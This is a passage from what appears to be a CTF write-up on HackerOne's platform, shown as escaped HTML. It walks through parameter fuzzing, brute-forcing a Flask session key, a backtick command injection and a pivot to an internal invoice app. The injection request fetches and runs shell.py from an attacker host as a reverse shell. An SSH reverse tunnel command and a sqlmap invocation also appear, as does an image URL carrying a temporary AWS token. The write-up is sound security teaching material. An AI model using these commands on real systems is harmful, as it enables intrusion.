session=eyJsb2dnZWRJbiI6dHJ1ZX0.XIHPog.46NKzPROJLINKkYDyQpOQI27JD0\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003ePython:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight python\"\u003e\u003ccode\u003e\u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003equeueRequests\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003etarget\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ewordlists\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e\n    \u003cspan class=\"n\"\u003eengine\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eRequestEngine\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eendpoint\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003etarget\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eendpoint\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n                           \u003cspan class=\"n\"\u003econcurrentConnections\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"mi\"\u003e20\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n                           \u003cspan class=\"n\"\u003erequestsPerConnection\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"mi\"\u003e40\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n                           \u003cspan class=\"n\"\u003epipeline\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"bp\"\u003eFalse\u003c/span\u003e\n                           \u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"o\"\u003e...\u003c/span\u003e            \n    \u003cspan class=\"k\"\u003efor\u003c/span\u003e \u003cspan class=\"n\"\u003eword\u003c/span\u003e \u003cspan class=\"ow\"\u003ein\u003c/span\u003e \u003cspan class=\"nb\"\u003eopen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;C:\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\\\u003c/span\u003e\u003cspan class=\"s\"\u003ewordlists\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\\\u003c/span\u003e\u003cspan class=\"s\"\u003ebackslash-powered-scanner-params.txt\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e\n        \u003cspan class=\"n\"\u003eengine\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003equeue\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003etarget\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ereq\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eword\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003estrip\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;: turbo.d.mydomain.com.br\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"o\"\u003e...\u003c/span\u003e \n\u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003ehandleResponse\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ereq\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003einteresting\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e\n    \u003cspan class=\"n\"\u003etable\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eadd\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ereq\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eNote that I just set the parameter value to \u003ccode\u003eturbo.d.mydomain.com.br\u003c/code\u003e which if resolved it will also be logged in my DNS. After this, I just sorted the result columns by status code, which showed me \u003ccode\u003e500\u003c/code\u003e for parameter \u003ccode\u003eport\u003c/code\u003e. Nice, we are now able to set the port. Next idea is to try changing the port to all values from 0-65535 and detect another service. Using Turbo Intruder it was easy:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight python\"\u003e\u003ccode\u003e\u003cspan class=\"o\"\u003e...\u003c/span\u003e\n    \u003cspan class=\"k\"\u003efor\u003c/span\u003e \u003cspan class=\"n\"\u003ex\u003c/span\u003e \u003cspan class=\"ow\"\u003ein\u003c/span\u003e \u003cspan class=\"nb\"\u003erange\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"mi\"\u003e65536\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e\n        \u003cspan class=\"n\"\u003eengine\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003equeue\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003etarget\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ereq\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ex\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eBut nothing different. Let\u0026#39;s try some injection, setting the port to \u003ccode\u003epassword@myserver.com:80\u003c/code\u003e could lead to \u003ccode\u003ehttp://update.flitethermostat:password@myserver.com:80/\u003c/code\u003e and thus achieving a SSRF to \u003ccode\u003emyserver.com\u003c/code\u003e. But it didn\u0026#39;t happen, the server returned error 500. Port was an integer parameter. Time to breath...\u003c/p\u003e\n\n\u003ch4 id=\"jwt\"\u003eJWT\u003c/h4\u003e\n\n\u003cp\u003eAfter logged in a session cookie is assigned which appears to be a flask JWT. jwt.io defines: \u003cem\u003eJSON Web Token (JWT) is an open standard (RFC 7519) that defines a compact and self-contained way for securely transmitting information between parties as a JSON object. This information can be verified and trusted because it is digitally signed.\u003c/em\u003e It also says that \u003cem\u003eJSON Web Tokens consist of three parts separated by dots (.), which are: Header.Payload.Signature .... this JSON is Base64Url encoded....\u003c/em\u003e.\u003c/p\u003e\n\n\u003cp\u003eBase64 decoded the first part:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e# session=eyJsb2dnZWRJbiI6dHJ1ZX0.XIHPog.46NKzPROJLINKkYDyQpOQI27JD0\n# eyJsb2dnZWRJbiI6dHJ1ZX0\n# echo -n \u0026#39;eyJsb2dnZWRJbiI6dHJ1ZX0=\u0026#39;  | base64 -d\n{\u0026quot;loggedIn\u0026quot;:true}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThere is only a \u003ccode\u003eloggedIn\u003c/code\u003e attribute... Nevertheless I decided to extend \u003ccode\u003ehttps://github.com/noraj/flask-session-cookie-manager\u003c/code\u003e  and create a brute force to \u003ccode\u003eapp.secret_key\u003c/code\u003e which is used to sign JWT in a flask app.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight python\"\u003e\u003ccode\u003e\u003cspan class=\"o\"\u003e...\u003c/span\u003e\n\u003cspan class=\"n\"\u003eparser_brute\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003esubparsers\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eadd_parser\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;brute\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ehelp\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;brute\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"n\"\u003eparser_brute\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eadd_argument\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;-p\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;--payload\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003emetavar\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;\u0026lt;string\u0026gt;\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n                            \u003cspan class=\"n\"\u003ehelp\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;Cookie value\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003erequired\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"bp\"\u003eTrue\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"n\"\u003eparser_brute\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eadd_argument\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;-w\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;--wordlist\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003emetavar\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;\u0026lt;string\u0026gt;\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n                            \u003cspan class=\"n\"\u003ehelp\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;Wordlist\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003erequired\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"bp\"\u003eTrue\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"o\"\u003e...\u003c/span\u003e\n\u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003ebruteforce\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003epayl\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ewordl\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e   \n    \u003cspan class=\"n\"\u003ef\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003eopen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ewordl\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;r\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"k\"\u003efor\u003c/span\u003e \u003cspan class=\"n\"\u003eline\u003c/span\u003e \u003cspan class=\"ow\"\u003ein\u003c/span\u003e \u003cspan class=\"n\"\u003ef\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n        \u003cspan class=\"n\"\u003es\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003esession_cookie_decoder\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003epayl\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"n\"\u003eline\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003estrip\u003c/span\u003e\u003cspan class=\"p\"\u003e())\u003c/span\u003e\n        \u003cspan class=\"k\"\u003eprint\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eline\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003estrip\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;  \u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"n\"\u003es\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n        \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;error\u0026#39;\u003c/span\u003e \u003cspan class=\"ow\"\u003enot\u003c/span\u003e \u003cspan class=\"ow\"\u003ein\u003c/span\u003e \u003cspan class=\"n\"\u003es\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n            \u003cspan class=\"k\"\u003eprint\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eline\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003estrip\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39; \u0026lt;\u0026lt;\u0026lt;\u0026lt;----- KEY\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n            \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e\n\u003cspan class=\"o\"\u003e...\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eDead end!\u003c/p\u003e\n\n\u003ch4 id=\"_\"\u003e_\u003c/h4\u003e\n\n\u003cp\u003eI was forgetting something:\u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"hint.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/451/366/a5f26a68fe31a826f7f9e243e4a74902f4b03282/hint.png?response-content-disposition=attachment%3B%20filename%3D%22hint.png%22%3B%20filename%2A%3DUTF-8%27%27hint.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ6J7UOFHP%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061333Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDamJ7YR2N3cIBOa8zjuSmUd9OCX8zCykCDx%2B6kH2J%2BlQIhAPFk51DuoGb47ygm%2F46VUWXIRiNzzPuAJCxpuNY6C9r8KrQDCFIQARoMMDEzNjE5Mjc0ODQ5IgwfJ9Wm2OgZB0TD5wEqkQMAyHxawucw3AMqEaVZmpdf%2FWoK6P8gu%2FCj%2FoC7vu86houcl7d5S1aesU3sbrOzgm6RSEhwz%2FFS3jL7D6T4JI4Ce1ND%2FrgO0lyXrQzDIcV61dzQW3FvNLr0ZImyyUdtac%2BXOj%2B4Yuxg3B%2Fw8%2FASrjXwhjBS66Kymk3L6dUfBdgwlGyaWjSrEj7pUe4QmHItRfpiYrIugF6V0YbiwTzCRnupZGkhFUvdnKltp%2B4hMIJ8ZpZXjRaPMFGYbJODmmGmpbXrkLNmtpD9ssAfsLLmMNbkAbfGTVhz1jb8jNtS70QChWZUcaVF%2BUJ%2BnjyviI%2BzOI3PvJo6%2BFF7nuwLNAutvngzDIQqSSVMoO%2F3MB45%2Bi7mOnnapSDDsV974XkQgCuM7vsb5p2hLCxzrxps5NEHGajQr5tkHe3qivszLUiVfsV43w8FYD%2BBONxEK7W9P8Fz8NZ67SyH7GG2ksQHMqmv0OcEaprPoRqnV3X2FUQMilKfrm8Mwo6y2b3BolwJdahB%2FiN%2B4DEDiSex%2FihlgZtj7Y4SxDDk%2FKn%2FBTrqAf559VpL8gNLdFBoVG3N%2FZOK1jnsPcfoIUSZtPAKUZCx%2FfYM8b4F5pg%2FUgEn1Lv%2B2LBdmNBasw6RmzajA5OSfdAMndyjJN9XxpB%2BQCxuWhR%2B4l3UYvcHCs0ptmeXrxe03i6oCQg6cNND1wBmViOKSrRB7ycvKEbOUFZtkHoRDVaID3Z%2BuOzyOMaLFXSvzsVsAcCFgFhIk5QJcY%2B1scZVna72pH8jnKw%2FwC1cIv1j%2FAmz0zBabFT7deSC5tUMl0pZQVYKiEGsgryYN9fSfaoMv2wR80e4kst1hVdlJHDktel9plUkLBliVB9%2BDQ%3D%3D\u0026amp;X-Amz-Signature=47775632614927365296c9906f2d8a3ee040ed2a26b64db4b84d52229afdd9c3\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/451/366/a5f26a68fe31a826f7f9e243e4a74902f4b03282/hint.png?response-content-disposition=attachment%3B%20filename%3D%22hint.png%22%3B%20filename%2A%3DUTF-8%27%27hint.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ6J7UOFHP%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061333Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDamJ7YR2N3cIBOa8zjuSmUd9OCX8zCykCDx%2B6kH2J%2BlQIhAPFk51DuoGb47ygm%2F46VUWXIRiNzzPuAJCxpuNY6C9r8KrQDCFIQARoMMDEzNjE5Mjc0ODQ5IgwfJ9Wm2OgZB0TD5wEqkQMAyHxawucw3AMqEaVZmpdf%2FWoK6P8gu%2FCj%2FoC7vu86houcl7d5S1aesU3sbrOzgm6RSEhwz%2FFS3jL7D6T4JI4Ce1ND%2FrgO0lyXrQzDIcV61dzQW3FvNLr0ZImyyUdtac%2BXOj%2B4Yuxg3B%2Fw8%2FASrjXwhjBS66Kymk3L6dUfBdgwlGyaWjSrEj7pUe4QmHItRfpiYrIugF6V0YbiwTzCRnupZGkhFUvdnKltp%2B4hMIJ8ZpZXjRaPMFGYbJODmmGmpbXrkLNmtpD9ssAfsLLmMNbkAbfGTVhz1jb8jNtS70QChWZUcaVF%2BUJ%2BnjyviI%2BzOI3PvJo6%2BFF7nuwLNAutvngzDIQqSSVMoO%2F3MB45%2Bi7mOnnapSDDsV974XkQgCuM7vsb5p2hLCxzrxps5NEHGajQr5tkHe3qivszLUiVfsV43w8FYD%2BBONxEK7W9P8Fz8NZ67SyH7GG2ksQHMqmv0OcEaprPoRqnV3X2FUQMilKfrm8Mwo6y2b3BolwJdahB%2FiN%2B4DEDiSex%2FihlgZtj7Y4SxDDk%2FKn%2FBTrqAf559VpL8gNLdFBoVG3N%2FZOK1jnsPcfoIUSZtPAKUZCx%2FfYM8b4F5pg%2FUgEn1Lv%2B2LBdmNBasw6RmzajA5OSfdAMndyjJN9XxpB%2BQCxuWhR%2B4l3UYvcHCs0ptmeXrxe03i6oCQg6cNND1wBmViOKSrRB7ycvKEbOUFZtkHoRDVaID3Z%2BuOzyOMaLFXSvzsVsAcCFgFhIk5QJcY%2B1scZVna72pH8jnKw%2FwC1cIv1j%2FAmz0zBabFT7deSC5tUMl0pZQVYKiEGsgryYN9fSfaoMv2wR80e4kst1hVdlJHDktel9plUkLBliVB9%2BDQ%3D%3D\u0026amp;X-Amz-Signature=47775632614927365296c9906f2d8a3ee040ed2a26b64db4b84d52229afdd9c3\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eCody is the creator of the CTF. Could this be a hint? I really didn\u0026#39;t know. But that made me try parameters with \u003ccode\u003e_\u003c/code\u003e:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eupdate_server=test\nserver_host=test\nhost_server=test\nupdate_host=test\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eSuddenly, I got \u003ccode\u003eConnecting to http://test:5000/ and downloading update manifest\u003c/code\u003e!! Yeah! So I was able to change the hostname and so do a SSRF... No, No. None of my attempts triggered a http request. What about a command injection? Using backticks (`) I was able to inject a sleep command. Success, let\u0026#39;s do a reverse shell:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eGET /update?port=80\u0026amp;update_host=localhos`wget+http://X.X.X.X:666/shell.py+-O+/tmp/.shell.py;python+/tmp/.shell.py;rm+-rf+/tmp/.shell.py`t HTTP/1.1\nHost: 104.196.12.98\nCookie: session=eyJsb2dnZWRJbiI6dHJ1ZX0.XIHPog.46NKzPROJLINKkYDyQpOQI27JD0\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eWe are inside! Where is the flag?\u003c/p\u003e\n\n\u003ch2 id=\"internal-server-172-28-0-3-invoice-app\"\u003eInternal Server (172.28.0.3) - Invoice App\u003c/h2\u003e\n\n\u003cp\u003eThere were no flags! Doing an initial recon I noticed that I was in a docker container. And the first thing that came to my mind was CVE-2019-5736, a docker container escape to host. But I decided to look more, initially the app source code at \u003ccode\u003e/app/main.py\u003c/code\u003e. Then check if there was others containers on the same network. What a surprise when I found another server at \u003ccode\u003e172.28.0.3\u003c/code\u003e with port 80 open. Using curl I was able to see that it was another web app, something about Hackerone invoices! \u003c/p\u003e\n\n\u003ch3 id=\"tunnel\"\u003eTunnel\u003c/h3\u003e\n\n\u003cp\u003eTo make my life easier and to not leak what I was doing I decided to make an SSH tunnel to my server with a port forwarding:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003epython \u003cspan class=\"nt\"\u003e-c\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;import pty;pty.spawn(\u0026quot;/bin/bash\u0026quot;)\u0026#39;\u003c/span\u003e\nssh \u003cspan class=\"nt\"\u003e-fN\u003c/span\u003e  \u003cspan class=\"nt\"\u003e-o\u003c/span\u003e \u003cspan class=\"nv\"\u003eStrictHostKeyChecking\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eno \u003cspan class=\"nt\"\u003e-o\u003c/span\u003e \u003cspan class=\"nv\"\u003ePreferredAuthentications\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003epassword \u003cspan class=\"nt\"\u003e-o\u003c/span\u003e \u003cspan class=\"nv\"\u003ePubkeyAuthentication\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eno \u003cspan class=\"nt\"\u003e-R\u003c/span\u003e \u003cspan class=\"k\"\u003e*\u003c/span\u003e:81:172.28.0.3:80 root@X.X.X.X \u003cspan class=\"nt\"\u003e-p\u003c/span\u003e 32777\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe above SSH command will forward all connection to local port 81 on X.X.X.X to 172.28.0.3:80. So from this moment on, I could use all my local exploits using localhost:81 as the target. \u003c/p\u003e\n\n\u003ch3 id=\"login\"\u003eLogin\u003c/h3\u003e\n\n\u003cp\u003eBrowsing the web app the first thing we could see is a login form. And again my first shot was a SQL Injection, which made no sense at all. Using only a backtick would fire an exception, but I could not build a valid query. Also tried SQLMap:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003e\u003cspan class=\"c\"\u003e# python sqlmap.py -u http://localhost:81/auth --data \u0026quot;username=admin\u0026amp;password=admin\u0026quot; --level=5 --risk=3\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eI also tried XPATH injection, LDAP injection and NoSQL injection. Nothing worked. Let\u0026#39;s move on.\u003c/p\u003e\n\n\u003ch3 id=\"new-invoice\"\u003eNew Invoice\u003c/h3\u003e\n\n\u003cp\u003eWe were also able to create invoices at \u003ccode\u003e/invoices/new\u003c/code\u003e. All the logic was inside \u003ccode\u003enewInvoice.js\u003c/code\u003e:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"nx\"\u003epreview\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"c1\"\u003e// kTHJ9QYJY5597pY7uLEQCv9xEbpk41BDeRy82yzx24VggvcViiCuXqXvF11TPusmb5TucH\u003c/span\u003e\n        \u003cspan class=\"c1\"\u003e//  5MmCWZhKJD29KVGZLrB6hBbLkRPn8o6H5bF73SgHyR3BdmoVJ9hWvtHfD3NNz6rBsLqV9\u003c/span\u003e\n        \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003ep\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003eencodeInvoice\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n        \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003eurl\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003ehttp://\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"nb\"\u003ewindow\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elocation\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ehostname\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e/invoices/preview?d=\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"nb\"\u003eencodeURIComponent\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ep\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n        \u003cspan class=\"nx\"\u003eurl\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003eurl\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ereplace\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"sr\"\u003e/\u003c/span\u003e\u003cspan class=\"se\"\u003e[\\u\u003c/span\u003e\u003cspan class=\"sr\"\u003e00A0-\u003c/span\u003e\u003cspan class=\"se\"\u003e\\u\u003c/span\u003e\u003cspan class=\"sr\"\u003e9999\u0026lt;\u0026gt;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026amp;]\u003c/span\u003e\u003cspan class=\"sr\"\u003e/gim\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ei\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan 